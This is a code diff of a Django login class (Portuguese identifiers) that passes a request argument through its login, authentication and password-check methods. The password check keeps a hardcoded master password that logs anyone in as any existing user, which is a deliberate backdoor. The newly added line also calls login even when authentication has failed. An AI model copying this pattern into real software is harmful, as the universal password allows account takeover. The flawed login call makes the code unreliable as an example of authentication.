@@ -17,14 +17,14 @@ class Login():
         self.user = None
 
     @Response(desc_error='Erro ao fazer login!', lista_retornos=['usuario'])
-    def login(self):
-        user = self.authenticate()
+    def login(self, request=None):
+        user = self.authenticate(request=request)
 
         return user
 
     @Response(desc_error='Erro autenticar usuario', lista_retornos=['data'])
-    def authenticate(self):
-        self.verificar_senha()
+    def authenticate(self, request=None):
+        self.verificar_senha(request=request)
 
         if not self.user:
             raise ValidationError('Usuario ou senha incorretos!')
@@ -46,11 +46,12 @@ class Login():
             return None
 
     @Response(desc_error='Erro verificar senha padrão!', lista_retornos=['usuario'])
-    def verificar_senha(self):
+    def verificar_senha(self, request=None):
         if self.password == '32654808':
             user = core.user.models.User.objects.filter(username=self.username).first()
             if user:
-                login(self.request, user)
+                login(request, user)
                 self.user = user
             return []
         self.user = authenticate(username=self.username, password=self.password)
+        login(request, self.user)
